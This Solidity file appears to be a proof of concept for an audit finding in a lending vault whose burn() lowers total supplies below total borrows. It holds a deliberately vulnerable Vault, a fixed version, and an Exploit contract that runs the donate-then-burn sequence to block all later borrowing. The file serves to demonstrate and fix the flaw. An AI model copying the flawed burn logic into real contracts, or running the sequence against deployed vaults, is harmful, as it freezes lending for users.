// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  CAP Labs Vault — inconsistent balance tracking (Trail of Bits, 2025-05),
    finding 61528. burn() decreases totalSupplies without checking the
    accounting available balance. A 5 token direct transfer lets a 15 token
    burn push totalSupplies to 85 while totalBorrows stays 90, so every
    later borrow of the asset reverts. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    Token public asset;
    uint256 public totalSupplies;
    uint256 public totalBorrows;

    constructor(Token _asset) {
        asset = _asset;
    }

    function mint(uint256 amount) external {
        totalSupplies += amount;
        require(asset.transferFrom(msg.sender, address(this), amount), "mint");
    }

    function availableBalance() public view returns (uint256) {
        return totalSupplies - totalBorrows;
    }

    function borrow(address to, uint256 amount) external {
        uint256 available = availableBalance();
        require(amount <= available, "available");
        totalBorrows += amount;
        require(asset.transfer(to, amount), "borrow");
    }

    function burn(address receiver, uint256 amount) external {
        // @> VULN: totalSupplies falls even when the withdrawal exceeds idle accounting balance
        totalSupplies -= amount;
        require(asset.transfer(receiver, amount), "burn");
    }
}

contract VaultFixed {
    Token public asset;
    uint256 public totalSupplies;
    uint256 public totalBorrows;

    constructor(Token _asset) {
        asset = _asset;
    }

    function mint(uint256 amount) external {
        totalSupplies += amount;
        require(asset.transferFrom(msg.sender, address(this), amount), "mint");
    }

    function borrow(address to, uint256 amount) external {
        require(amount <= totalSupplies - totalBorrows, "available");
        totalBorrows += amount;
        require(asset.transfer(to, amount), "borrow");
    }

    function burn(address receiver, uint256 amount) external {
        require(totalSupplies - amount >= totalBorrows, "idle");
        totalSupplies -= amount;
        require(asset.transfer(receiver, amount), "burn");
    }
}

contract Exploit {
    Token public asset;
    Vault public vault;
    address public bob;
    bool public borrowOpened;
    uint256 public suppliesAfter;
    uint256 public borrowsAfter;

    constructor() {
        asset = new Token("ASSET");
        vault = new Vault(asset);
        bob = address(0xB0B);
        asset.mint(address(this), 105 ether);
    }

    function _tryBorrow(uint256 amount) internal returns (bool ok) {
        try vault.borrow(bob, amount) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function run() external {
        asset.approve(address(vault), 100 ether);
        vault.mint(100 ether);
        vault.borrow(bob, 90 ether);
        require(asset.transfer(address(vault), 5 ether), "donate");
        vault.burn(address(this), 15 ether);
        borrowOpened = _tryBorrow(1 ether);
        suppliesAfter = vault.totalSupplies();
        borrowsAfter = vault.totalBorrows();
        require(borrowOpened == false, "borrow must revert");
        require(suppliesAfter == 85 ether, "supply is 85");
        require(borrowsAfter == 90 ether, "borrows stay 90");
        require(suppliesAfter < borrowsAfter, "supply below borrows");
        require(asset.balanceOf(bob) == 90 ether, "bob still holds the borrow");
    }
}
